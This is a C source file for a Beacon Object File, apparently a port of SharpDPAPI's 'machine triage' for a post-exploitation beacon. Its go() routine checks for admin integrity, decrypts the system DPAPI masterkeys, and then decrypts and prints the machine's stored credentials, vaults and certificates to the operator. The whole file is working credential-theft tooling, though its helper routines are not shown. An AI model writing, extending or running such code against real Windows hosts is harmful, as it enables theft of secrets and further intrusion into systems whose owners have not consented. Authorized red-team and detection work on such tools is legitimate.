/*
 * machinetriage.c — BOF for full SYSTEM DPAPI triage
 *
 * Usage:
 *   machinetriage
 *
 * Complete machine triage: decrypts DPAPI_SYSTEM masterkeys, then
 * enumerates and decrypts all machine credentials, vaults, and certs.
 * Requires high integrity.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "dpapi_common.h"
#include "triage.h"
#include "helpers.h"

void go(char* args, int args_len) {
    (void)args; (void)args_len;

    BeaconPrintf(CALLBACK_OUTPUT,
        "\n=== SharpDPAPI Machine Triage (BOF) ===\n");

    if (!is_high_integrity()) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] Must run from high integrity (admin) context\n");
        return;
    }

    MASTERKEY_CACHE cache;
    mk_cache_init(&cache);

    /* Step 1: Decrypt machine masterkeys */
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] --- Machine Masterkeys ---\n");
    triage_system_masterkeys(&cache);

    if (cache.count == 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[!] No machine masterkeys decrypted\n");
        mk_cache_free(&cache);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Decrypted %d machine masterkey(s)\n\n", cache.count);

    /* Step 2: Triage credentials */
    BeaconPrintf(CALLBACK_OUTPUT, "[*] --- Machine Credentials ---\n");
    triage_system_creds(&cache);

    /* Step 3: Triage vaults */
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] --- Machine Vaults ---\n");
    triage_system_vaults(&cache);

    /* Step 4: Triage certificates */
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] --- Machine Certificates ---\n");
    triage_system_certs(&cache, NULL, FALSE);

    /* Summary */
    BeaconPrintf(CALLBACK_OUTPUT,
        "\n[*] Machine triage complete. %d masterkey(s) used.\n",
        cache.count);

    mk_cache_free(&cache);
}
